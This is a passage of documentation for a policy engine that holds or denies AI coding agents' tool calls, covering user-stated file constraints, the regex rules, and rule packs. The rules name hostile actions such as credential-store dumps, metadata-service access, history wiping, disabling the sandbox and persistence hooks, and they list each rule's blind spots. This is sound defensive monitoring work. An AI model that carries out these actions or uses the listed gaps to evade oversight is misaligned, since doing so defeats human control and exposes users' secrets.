it only in a clause that asks the agent for the change: the change word in its plain form with only words of asking or
allowing before it ("X is frozen in production, but you can edit it locally", "if tests fail, fix them"). One that
mentions a change without handing it over lifts nothing: "ask me before you change it", "I'll update it myself",
"we'll change it in the next PR", "explain how you would change it", "changing it breaks the deploy", and also "don't
forget to update it" and "you'll need to edit it", whose held call the person approves. A clause that waits on the
person lifts no file, named or by "it": "you can change it after I approve", "feel free to edit X once I say so", "to
change it, ask me first", "should you need to change it, ask me", and a lift followed by a clause that only names the
go-ahead ("you can change it later, but ask me first"). On E20's 56 honest sessions none holds a call
([evaluation](evaluation.md#e20-intent-reasoning-and-action-checks)):

| Kind | Read from | Holds |
|---|---|---|
| `keep_away` | a negated change of a file X ("don't touch / modify / edit / write to X", "make no changes to X", "please refrain from editing X"), X said to stay as it is ("leave X alone / as is", "X stays untouched", "X is read-only / off-limits / out of scope", "X must not be modified"), "hands off X", "stay away from X", "keep (all) your changes / your hands / any edits / yourself out of X" (not "keep the API key out of X"), "make no changes there" for the file named before. X is a file ("billing.py", or a name people give without an extension: "the Dockerfile", "Makefile") or a directory ("anything in vendor/", "leave src/legacy/ alone", "the vendor folder", "the .github folder"; not "the home / root / current / working / parent directory", a place rather than a folder's name; not "anything outside src/", a scope); a folder word beside a file keeps the file's constraint ("use the tmp folder for scratch files and leave config.yaml as is") | a call that writes X, or under directory X: a write tool's path or paths (every file of a Codex patch), a shell redirection, `rm`, `touch`, `tee`, `sed -i`, `dd of=`, `patch`, the destination of `cp`, `mv`, `rsync` or `scp`, `git rm`/`mv`/`restore` and `git checkout -- X`, `find -name X -delete`, a formatter writing in place (`black`, `prettier --write`, `ruff format`); shell commands read as the policy engine reads them, through `bash -c`, `eval`, wrappers, argv lists and OpenAI's `commands` |
| `only_change` | "only change / edit / modify / touch X", "only X should change", "limit the change to X", "touch nothing but X", "don't change anything except / but / other than X", "read-only except X"; "don't change anything else", "X and nothing else", "everything else is out of scope": each file the request names | a call that writes any other file: checked after the run (TK-X204), never held live by the hook |
| `read_only` | "don't change anything", "change nothing", "don't make any changes" unless what follows picks the changes out: "to", "of", "in", "on" and the like naming what they are to ("to the tests", "on main"; "... in vendor/" keeps vendor/ away), or "that", "which", "beyond", "outside", "for the sake of" ("that break the API", "beyond what the fix needs", "for the sake of style"). The whole project ("to the code / the repo / my project / the files / the workspace", "on disk", "on this machine"), how many or when ("of any kind", "in the meantime", "under any circumstances", "to any file", "for now") and how or for whom ("directly", "for any reason", "for me", "on your own") stay read-only, and "read-only" naming no file as an instruction ("read-only: just tell me", "stay read-only", "work in read-only mode") | any call that writes, commits or installs |
| `no_push` | "don't push", "never push", "no pushing", "don't push it to origin" | a `git push` |
| `no_network` | "no network (access)", "no internet", "don't use the web", "don't go online", "work / stay offline", "work without internet access" | an http or browser call, `WebFetch`, `curl`, `wget`, `ssh`, `git pull`/`fetch`/`clone`/`push`, a package install |

After the policy engine has decided, the signer checks each call of the run against the run's constraints. A call
that breaks one is raised to `ask` with the rule `TK-CONSTRAINT` added; a person answers it like any other ask (an
agent approver never does). A `deny` stays a `deny`, an `ask` stays an `ask`, and nothing is ever lowered, so a
constraint can only hold more calls. That is why any client of the run may add one, the agent's own identity included:
a made-up constraint only makes the agent wait.

The agent is told why, in its own words. The decide response carries it as `reason` (`the person's request in this run
said not to modify billing.py; ask the person`, with `TK-CONSTRAINT` in its `rule_ids`), and Claude Code's hook prints
it after the approval it waits for: `[tracekit] waiting for approval apr-… (TK-CONSTRAINT): the person's request in
this run said not to modify billing.py; ask the person`. The file name comes from
the call's own arguments. The log never holds it: `constraint.added` records the kind and, for a file, a salted
commitment to its lower-cased base name ([format v2](format-v2.md#3-events)), and the signer matches a call by
committing each file it writes under that record's salt. The prompt itself is recorded beside it (`input.observed`,
source `<agent>:UserPromptSubmit`, `<agent>` the harness), its text in the content vault when the signer keeps content.

A constraint equal to one the run has (the same kind; for a file, the same name) is that one, so a request repeated
in every prompt never fills the run. A run takes 32 file constraints (`keep_away`, `only_change`); `read_only`,
`no_push` and `no_network`, at most one each, are always added. Past them a new file constraint is a signed
`capture.gap{constraint_refused}` (a `gaps` warning in `tracekit verify`), `constraint_add` answers `refused: true`,
the hook tells the person (`[tracekit] the run has the most file constraints the signer takes ...`, a non-blocking
error the harness shows), and from then on the run fails closed: every call that writes is held ("the run has the most
file constraints the signer takes (32), and a further one was not added, so every write is held"). So an agent that
adds made-up constraints to fill the run only holds its own writes. A call that writes more than 256 distinct files
is held in a run with a file constraint: the signer checks at most 256 names per call. After a signer restart the
constraints, and a refusal, come back from the run's records.

`tracekit analyze --v2` reads an approval of a held call: by an identity other than the run's (signer.yaml
`approvals`), the person approved breaking the constraint for that call, and its TK-X204 finding is low, labelled
`approved`; a self-approval (the dev signer's, where the person and the agent are one user) lowers nothing.
`tracekit analyze --v2` checks the same constraints after the run, with the model's own statements too
([TK-X204](findings.md#v2-runs-what-was-asked-said-and-done-tracekit-analyze---v2)); `tracekit verify` checks that
each `TK-CONSTRAINT` hold comes after a constraint ([verdicts](verdicts.md#live-constraints)). What the grammar misses
is in the [limits](limits.md#intent-reasoning-and-action-checks).

## Patterns: the RE2 subset

Patterns must mean the same to RE2 (`google-re2`, used when installed) and to the `regex` module in ASCII mode
(the fallback), so a decision does not depend on the engine. `tracekit policy lint` rejects:

- lookaround, backreferences, atomic groups, possessive repeats, `\Z`;
- groups other than `(?:` and `(?P<name>`, so no inline flags or comments;
- nested sets and `[: :]` classes; a letter or digit escape other than `\d \D \w \W \s \S \b \B \A \n \t \r \f \v
  \xHH` (inside a set: `\d \D \w \W \s \n \t \r \f \v \xHH`), and non-ASCII escapes (escaped ASCII punctuation is fine);
- a literal `{` that isn't escaped, a repeat without a lower bound, repeat counts above 1000 (nested counts
  multiplied: `(?:a{10}){101}` is 1010);
- an unbounded repeat whose body starts with an unbounded repeat (`(a+)+`, `(.*a)*`), the classic catastrophic shape.
  It doesn't refuse a bounded repeat of one (`^(.*?,){11}P`, 5 s on 260 characters) or overlapping alternatives
  under a repeat (`(a|aa)+$`, 3 s on 35): telling those from linear ones (`([^"@]*@){10}`, TK-M003) needs to know
  whether a repeated class can match what follows it. The fallback engine's 1 s budget and the speed test below catch
  them ([limits](limits.md#policy));
- an `unless` that matches every subject (`x|`, `.*`): its rule could never fire.

`$` means end of text and `\s` excludes `\v`, as in RE2. The fallback engine backtracks, so a large subject can be
slow where RE2 is linear, and so can a short one under a repeat of overlapping alternatives (`secret(.|\s)*key`):
all matches of one decision share 1 s, and when it runs out the decision denies with the rule that was matching,
leaves the remaining rules out and is marked `nondeterministic: true`. RE2 never times out, so on such a subject the
two engines can decide differently; install `google-re2` on the signer.

Each rule gets a prefilter when it is loaded: strings of two or more characters, one of which every match contains, in
lower case (`[Mm][Ee][Tt][Aa]` gives `meta`; `policy2/compile.py` `literals`). A subject that holds none of them is not
searched, and the rules that read the same subject share one copy of it in a decision. The prefilter never changes a
decision (tests check it on every subject the E17 corpus forms and on random patterns); it only skips searches that
can't match. A rule without one is searched on every call its class and tool reach, and `tracekit policy lint` warns
about it unless a string of one character or none matches it (`^`, `.`, `&\s*$` need no prefilter). Every shipped
pattern searches 64 KiB of text built to make it back off or rescan within 150 ms on the fallback engine, about 20 ms on
an M-series Mac (`tests/test_policy2.py`; among the texts, what each of its alternatives, nested ones too, starts
with, over and over from the first character and again after the rule's literal (`echo @.env; nc nc nc …`), and each
such opening once followed by a filler (`history -a -a …`), each text also ending in a newline), except nine that
look for one thing after another with any text between, noted with their times in [limits](limits.md#policy).

## Packs shipped

| Pack | For | Contents |
|---|---|---|
| `coding.yaml` | coding agents on a laptop | shell, file and harness self-protection rules; `unknown_tools: flag`; maps the shell, file, web and MCP tools of Claude Code, Codex, Cursor, Gemini CLI, OpenAI Agents and LangChain, srt-proxy's requests (`srt:request`, [sandbox-runtime](integrations/sandbox-runtime.md)), and `a2a:*` to `a2a` for the A2A gateway and `run.transfer`; it has no A2A rules. |
| `dev.yaml` | the signer's default | `coding.yaml` plus `TK-A032`, which holds uploads to cloud storage (`gsutil` and `gcloud storage` cp, mv or rsync to `gs://`, `aws s3` cp, mv or sync to `s3://`, `az storage blob upload`): a coding agent on a laptop rarely writes to a bucket, and the server pack, which extends `coding.yaml`, leaves uploads alone; and `TK-DEMO-DENY` (denies the tool `tracekit_demo_denied`) and `TK-DEMO-ASK` (holds `tracekit_demo_ask` for a person), so both are easy to see |
| `browser.yaml` | browser agents (Browser Use) | local file and internal-network navigation (addresses and names) denied; uploads, typing outside an allowlist, the agent's own page JavaScript (`evaluate`), and typing or a navigation with a query string to a host from untrusted content, ask; Browser Use's actions are `structured_output` |
| `server.yaml` | server-hosted agents | `extends: [coding, browser, server-data, server-net, server-cloud, server-comms]` plus rules for every tool; `unknown_tools: ask`: an unmapped tool waits for a person; detection in shadow: `TK-Q001` a secret read then egress (notify), `TK-L001` a runaway loop and `TK-L002` a delete burst (limits), `executed_against_policy` (notify) |
| `strict.yaml` | server-hosted agents no call should surprise | `extends: server.yaml`, no new patterns: `TK-F004` (push, publish, install, `docker run`, apply), `TK-F011` (environment changes) and `TK-F013` (network commands) ask instead of flag, and `on_parse_error: deny` |
| `server-data.yaml` | SQL tools | destructive and privilege-changing SQL, SQL that reaches the server's shell or files |
| `server-net.yaml` | HTTP tools | internal addresses; a body sent outside the egress allowlist |
| `server-cloud.yaml` | cloud CLIs and cloud MCP tools | IAM and access changes denied; resource deletion asks |
| `server-comms.yaml` | payments, email, chat | moving money, mass email and whole-channel notifications ask |

`coding.yaml` rules (see the file for patterns and rationales):

| Section | Rules |
|---|---|
| deny | `TK-D001` privilege escalation · `TK-D002` running a downloaded script · `TK-D003` force push: `--force` (also `--force-with-lease`), `-f` in a short-option cluster before any `o` (`-uf`, `-4f`), a `+` refspec or `--mirror` (or any prefix of it), read in the push's own words as `TK-A002` reads them, so a later command (`git push && ls -f`) or a commit message naming a force push isn't one · `TK-D004` recursive delete of root or home · `TK-D010` writing a credentials file from the shell: `cp`, `mv` or `install` with it last, `tee` with it among its files, or a redirection into it, each command on its own (a wrapper's, `find -exec`'s or a nested shell's too); a read redirected from one (`< .env`) is denied too, since a redirection's target doesn't say which way it goes · `TK-D011` sending credential files off the machine · `TK-D006` uploading a secrets file · `TK-D008` modifying the harness's transcripts · `TK-D005` writing a credentials file · `TK-D009` writing the harness's transcripts · `TK-D007` touching Tracekit's own files or signer · `TK-D013` writing Tracekit's files, signer state or policy · `TK-D020` dumping a whole OS credential store (`security dump-keychain`, also after security's global options, `secret-tool search --all`, `pass grep`) · `TK-D021` installing a package directly from a URL |
| ask | `TK-A001` destroying a deployment, database or volume, or removing infrastructure state: `terraform`/`tofu`/`terragrunt destroy` and `apply -destroy` (terragrunt also after `run`, `run-all` or `stack run`, and its older `destroy-all`), `terraform state rm`/`tofu state rm`, `pulumi destroy`/`down`/`dn`, `pulumi stack rm` and `dropdb`, also under `railway run` or `heroku run`; `cdk destroy` and `railway delete`/`remove`/`rm`/`down` (also through `npx`, `bunx`, `pnpm dlx`, `yarn dlx` or `npm exec`), `fly destroy`/`delete`/`remove`/`rm`, `heroku apps:` or `addons:destroy`/`delete`/`remove` and `pg:reset`, and a `curl`/`wget`/`http`/`xh`/`railway api` call carrying a `volumeDelete(`/`serviceDelete(`/`environmentDelete(`/`projectDelete(`/`databaseDelete(` mutation. For `terraform`, `tofu`, `terragrunt`, `fly` and `cdk`, up to four option groups may precede the subcommand; npx-style launchers permit up to four before the launched program (`cdk --app infra/app.js destroy prod`, `npx --yes cdk destroy`). `--help` as the last word after at most two subcommand words (`terraform destroy --help`) is exempt. It doesn't see a request body read from a file or pipe (`-d @mutation.json`), an interpreter one-liner (`node -e`, `python -c`), a command run inside a container or remote shell (`docker run … terraform destroy`, `fly ssh console -C`, `heroku run bash -c …`), SQL such as `psql -c 'DROP DATABASE'`, a saved destroy plan (`terraform plan -destroy -out=p`, then `terraform apply p`), or more options before the subcommand · `TK-A002` deleting a remote Git branch or tag with `git push --delete` or `-d` (also abbreviated, `--del`, or in a short-option cluster, `-4d`), a deletion refspec (`:branch`, or an all-zero source object id) or `--prune`, also after an argument with a newline in it; a dry run is held too (`--mirror`, or any prefix of it, is `TK-D003`'s). It doesn't see a deletion set through config (`-c remote.origin.push=:b`, `-c remote.origin.mirror=true`) or a Git alias (`-c alias.p=push`; the server pack's `TK-S006` denies every `-c alias.*`), more than eight global options before `push` (a bound against backtracking), a quoted value with a space (`-C 'my dir'`), a refspec from a variable, brace expansion or `xargs`, a shell alias or function or `git send-pack` · `TK-A033` merging a pull request: `gh pr merge` (also `--auto` and `--admin`) and `glab mr merge` or `accept`, with up to four options before each word; a request to GitHub's or GitLab's merge endpoint (`…/pulls/N/merge`, `…/merge_requests/N/merge`, `N` possibly a variable) or one carrying GitHub's GraphQL `mergePullRequest`, `enablePullRequestAutoMerge` or `enqueuePullRequest`, or GitLab's `mergeRequestAccept`, through `gh`, `glab` or `hub api`, `curl`, `wget`, HTTPie or `xh`, also after an argument with a newline in it (a multi-line query); a status check on the endpoint is held too; a local `git merge` isn't held, and a merge asking for `--help` is (`gh pr merge 42 --body --help` merges) · `TK-A042` deleting a repository or project through a platform's API: a `DELETE` request to GitHub's `/repos/<owner>/<repo>`, GitLab's `/api/v4/projects/<id>` or Vercel's `/v9/projects/<name>` (the path ends at the repository or project, so deleting one issue comment or another sub-resource isn't held) through `gh`, `glab` or `hub api`, `curl`, `wget`, HTTPie or `xh`, with the method before or after the URL (HTTPie's and `xh`'s also without the scheme or in lowercase); `gh repo delete`, `glab repo delete`, `glab project delete`, `hub delete` and `vercel remove`, `rm` or `project(s) remove`/`rm`, with up to four options before each word; a bare `repos/<owner>/<repo>` path as a `gh` or `hub api` argument, or a bare `projects/<id>` path as a `glab api` argument, with the method before or after it and up to sixteen option words around the method (a path that runs past the repository or project, such as a branch or file under it, isn't held); or a GraphQL `deleteRepository` mutation, also after an argument with a newline in it (a multi-line query); a `GET` of the same URLs isn't held · `TK-A034` applying a patch through the shell: Codex's `apply_patch` or `applypatch` (in any `/` directory, also started as `apply_patch` with `exec -a` or `env --argv0`, through a wrapper or a nested shell; `.bat` or `.cmd` on Windows) and `--codex-run-as-apply-patch` as a program's first argument (`codex`, its binary under another name, or after its npm launcher's script), which Codex applies itself, so no file rule reads the patch's files; every such patch is held, one to an ordinary file too; `git apply` and `patch` aren't held · `TK-A035` reading a secret's value from a cloud secret store: `aws secretsmanager get-secret-value` and `batch-get-secret-value`; `aws ssm get-parameter`, `get-parameters`, `get-parameters-by-path` and `get-parameter-history` with `--with-decryption` (`--no-with-decryption` is not it); `gcloud secrets versions access` (also `alpha` and `beta`); `az keyvault secret show`, `show-deleted` and `download`, each with up to eight options before the service and before each of its words, and `--with-decryption` also as any prefix of it (`--with-d`). Listing and describing secrets, and reading a parameter without decryption, are not held. It doesn't see a command built in a variable, one run inside a container or remote shell, an SDK call in an interpreter one-liner (`python -c`, `node -e`), or another store (`vault kv get`, `op read`, `kubectl get secret`) · `TK-A036` the same commands as the `cli_command` (also `cliCommand`), `command` or `cmd` argument of an MCP tool (the AWS API MCP server's `call_aws`), for a tool whose name ends in a word for running a command (`aws`, `cli`, `command`, `cmd`, `exec`, `execute`, `run`, `shell`, `bash`, `terminal`; so that no MCP call over 64 KiB turns into an ask), when the value starts with the program, after spaces only (no tab, path, wrapper, `VAR=` prefix or `cd x &&` is read there) · `TK-A037` the same through an MCP tool whose name says it returns a secret (`get_secret_value`, `batch_get_secret_value`, `GetSecretValue`, `access_secret_version`, `get_secret`, `keyvault_secret_get` and the like, as `mcp__<server>__<tool>` or `mcp:<server>/<tool>`, with `_` or `-` between the words, or in CamelCase); a tool that lists, describes, creates or writes secrets isn't held, nor is GitHub's secret scanning · `TK-A038` an MCP tool that reads an SSM parameter (`get_parameter`, `get_parameters`, `get_parameters_by_path`, `get_parameter_history`) with decryption turned on (`WithDecryption`, `with_decryption`, `withDecryption`, `decrypt` or `decryption` set to true, `"true"` or `1`) · `TK-A003` running a command outside Claude Code's sandbox: a call whose `dangerouslyDisableSandbox` argument is `true` ([Claude Code's sandbox](integrations/claude-code-sandbox.md)) · `TK-A014` opening network hosts beyond Claude Code's sandbox for one command: a call whose `allowed_domains` (auto mode's per-command allow list) names any host ([Claude Code's sandbox](integrations/claude-code-sandbox.md#per-command-allowed-domains-tk-a014)) · `TK-A004` running a command with more than Gemini CLI's sandbox allows: a call whose `additional_permissions` turns the network on or names a path to read or write ([Gemini CLI's sandbox](integrations/gemini-sandbox.md)) · `TK-A010` adding something that runs at every login or boot: a file-editing tool writing under `Library/LaunchAgents/` or `Library/LaunchDaemons/`, `.config/systemd/user/`, `.config/autostart/`, `/etc/systemd/system`, `/etc/init.d`, `/etc/rc.local`, `/etc/xdg/autostart` or `lib/systemd/system/` or `user/` · `TK-A011` the same from the shell: `cp`, `install`, `mv` or `ln` into those places (the last word, or `-t`'s directory, the place itself or a file in it), `tee`, a redirect, `sed -i` or `dd of=` naming them, and `launchctl load`/`bootstrap`/`enable` or `systemctl enable`/`reenable`/`preset`/`add-wants` after any options; each command on its own, as `TK-D010` reads them, and in any case; listing them, copying out of them and reading them (but for a read redirected with `<`) and managing an existing service (`systemctl status`, `restart`) are not held · `TK-A012` writing a Git hook (a path under `.git/hooks/`) · `TK-A013` the same from the shell (`cp`, `install`, `mv` or `ln` into `.git/hooks`, as `TK-A011` reads them; `tee`, a redirect, `chmod` or `sed -i` naming it), and setting or unsetting `core.hooksPath` with `git config` (after at most eight global options, as `TK-A002` reads `push`), which points every hook at another directory; reading it (`git config --get core.hooksPath`) is not held · `TK-A020` targeted reads of named OS/browser credential stores, in any case (a Grep of a whole store's directory too) · `TK-A021` commands that read those stores (`security find-generic-password` or `find-internet-password`, also after security's global options; `secret-tool lookup`; `kwallet-query`; every `pass` command that decrypts an entry, `pass NAME` included) or list an SSH agent's keys (`ssh-add -L`) · `TK-A022` writes to Docker daemon configuration or socket · `TK-A023` direct `docker run` or `podman run` with host privileges, process space or root mounts · `TK-A024` writes to known package-source configuration files · `TK-A030` the same from the shell: a file `effects` names (a redirection, `tee`, `cp`, `mv`, `install`, `ln`, `dd` or `sed -i` writing `.npmrc`, `pip.conf`, `.pypirc`, apt sources or yum repos) · `TK-A025` installs with an explicit index or registry (also `-f`/`--find-links`, `uvx`, `npx` and any `pipN.N`), a `config set` (`npm set`) of one, or a source variable pip, uv or npm read (`PIP_INDEX_URL=… pip install`, `export npm_config_registry=…`); publishing is exempt · `TK-A026` writes to named shell-history files or `/var/log`, in any case · `TK-A027` the same from the shell: a history file or `/var/log` (macOS's `/private/var/log` too) that `effects` names as written or deleted, in any case · `TK-A029` clearing shell history (`history -c`), turning it off (`unset HISTFILE`, `set +o history`, `HISTFILE=/dev/null`) or vacuuming the journal (`journalctl --vacuum-*`) · `TK-A028` installing a package directly from a version-control source (`git+https://`, `git+ssh://`) · `TK-A031` destroying cloud storage data: a version purge (`gsutil rm -a`, `gcloud storage rm --all-versions`, an S3 object version), a recursive delete or a wildcard delete (`*` only: `?` and `[…]` are flagged), a batch delete or a bucket delete (gsutil, gcloud storage, aws s3 and s3api, az storage blob, file, fs and container, `az storage remove --recursive`, rclone, s3cmd), with up to eight options before the service and again before its verb, also after an argument with a newline in it; one object's delete is only flagged (`TK-F003`) · `TK-A039` dropping, truncating or deleting without a WHERE through a database client: `psql -c`/`--command`, `mysql`/`mariadb -e`/`--execute`, `mongosh`/`mongo --eval` (`db.dropDatabase()`, `drop`, `deleteMany`/`deleteOne`/`remove` with an empty filter), `sqlite3`'s bare SQL argument, `clickhouse-client --query`, `redis-cli`/`valkey-cli` `FLUSHALL`/`FLUSHDB` as the last word, and `psql` through a `docker`/`kubectl exec` wrapper; a transaction that ends in `ROLLBACK` does not exempt the statement: a rolled-back destructive statement is held like any other. A SELECT, SHOW, EXPLAIN, a scoped DELETE and read-only calls are not held · `TK-A040` a cache flush piped into `redis-cli` or `valkey-cli`: echo or printf printing exactly `FLUSHALL`/`FLUSHDB` (optionally `ASYNC`/`SYNC`), optionally through tee stages; a flush word merely appearing in piped text is not held · `TK-A041` a destructive SQL statement in an SQL-like MCP tool's `sql`/`query`/`statement` argument (DROP needs its object word: TABLE, DATABASE, SCHEMA and the rest); it reads the tool's name, so a non-SQL tool whose `query` text is itself a destructive statement is not held, and there is no ROLLBACK exemption |
| flag | `TK-F001` network commands · `TK-F002` web requests · `TK-F003` destructive commands · `TK-F004` side effects (push, publish, install, apply) · `TK-F005` secrets access · `TK-F006` MCP tools · `TK-F007` / `TK-F008` / `TK-F014` background processes · `TK-F009` harness config file paths · `TK-F015` harness config shell write/delete targets · `TK-F016` `ANTHROPIC_BASE_URL` in argv or raw arguments · `TK-F010` shell function or alias shadowing · `TK-F011` environment tampering · `TK-F012` egress (any URL a call acts on) · `TK-F013` egress (a network command) |

`strict.yaml` is for an agent whose every change outside its workspace a person should see first: a push, a
package install or publish, `docker run`, `terraform apply`, `kubectl apply`/`delete`, a network command (`curl`,
`ssh`, `dig`) and an environment change (`PATH=`, `LD_PRELOAD=`, a write to a shell startup file) wait for an
approval, and a shell command the parser can't read is denied. Two flags stay flags: `TK-F007` matches `crontab -l`,
which only lists, and `TK-F012` (any URL a call acts on) would hold every web request and navigation (20% of E17's
benign calls). It holds 4.5% of E17's benign calls (36 of 800; the server pack, 0.12%), 10.0% of E21's developer
session calls (the server pack, 1.5%) and 10.9% of E21's held-out benign calls (4.2%), while catching 65.2% of E21's
held-out harmful calls (58.3%; both measured after rule changes, on a pool no longer blind:
[evaluation](evaluation.md#e21-policy-robustness)). Use it where a person answers holds promptly,
not for an agent that works unattended on a laptop.

A deployment extends `server.yaml` (or composes only the packs it needs), maps its own tool names under `tools` (a
business tool no class fits, such as `book_hotel`, to `app`, so it isn't held as unknown), and redefines a rule by id
to change it: TK-N002's egress allowlist and TK-B011's typing allowlist name `example.com` until
it does. Cloud APIs are covered as CLI commands on a shell tool and as MCP tools; other cloud-SDK-shaped tools need a
mapping and rules of their own.

Server rules (ask rules hold the call for a person):

| Pack | Section | Rules |
|---|---|---|
| `server.yaml` | deny | `TK-S001` cloud metadata service (169.254.169.254 in any notation, fd00:ec2::254, metadata.google.internal, the short names metadata and instance-data, ECS and Alibaba) in what any tool acts on (`target`) · `TK-S002` / `TK-S003` a secret (private key, cloud, VCS, chat, payment or model API token, JWT, URL with a password) in any tool's arguments or a shell line · `TK-S004` credential files (cloud, kube, docker, gcloud, azure, service account token, .pgpass, .netrc, .git-credentials, SSH private keys, /proc/*/environ) in what any tool acts on (`target`: a path, a command's arguments and redirections, an attachment, an MCP tool's arguments; not file content or a commit message) · `TK-S006` a command run through another command's options (tar, git config keys in any case and aliases, ssh, scp, zip, rsync, vim) |
| `server.yaml` | ask | `TK-S010` an MCP tool that takes a command |
| `server-data.yaml` | deny | `TK-DB001` DROP · `TK-DB002` TRUNCATE · `TK-DB003` DELETE without a WHERE (or with an always-true one) · `TK-DB004` GRANT, REVOKE, ALTER/CREATE USER or ROLE · `TK-DB005` COPY … PROGRAM, xp_cmdshell, server file functions, INTO OUTFILE, LOAD DATA INFILE, ATTACH |
| `server-net.yaml` | deny | `TK-N001` request to an internal address (`internal`) · `TK-N003` request to an internal name (localhost, a name without a dot, .internal, .local, .svc, …) · `TK-N002` a body or POST/PUT/PATCH to a host outside the allowlist |
| `server-cloud.yaml` | deny | `TK-C001` IAM, role binding, access key and public-bucket changes (aws, gcloud, gsutil, az, kubectl) · `TK-C002` the same through an MCP tool |
| `server-cloud.yaml` | ask | `TK-C010` deleting cloud resources (instances, databases, buckets, clusters, namespaces, stacks; helm uninstall; terraform, tofu and pulumi destroy in another tool's `cli_command`, `command` or `cmd` argument; on a shell tool they are the coding pack's `TK-A001`) · `TK-C011` an MCP tool whose name says it deletes |
| `server-comms.yaml` | ask | `TK-M001` a payment with an amount · `TK-M002` payouts, transfers, charges and refunds by tool name · `TK-M003` ten or more recipients, or a whole-company address · `TK-M004` @channel, @here or @everyone in Slack |

SQL keywords match `code`, outside comments, literals and quoted identifiers in every dialect, so
`SELECT 'DROP TABLE x'` is allowed. `eval/e17_policy_corpus.py`
runs `server.yaml` over the deny and benign corpora in `tests/data/policy/` with both engines and reports per-class deny
recall and the benign false-positive rate.

Rules match raw strings: they are tripwires that make attempts visible, not the protection itself. The protection is
the signer's isolation, its storage and the witnesses ([server threat model](threat-model-server.md)).
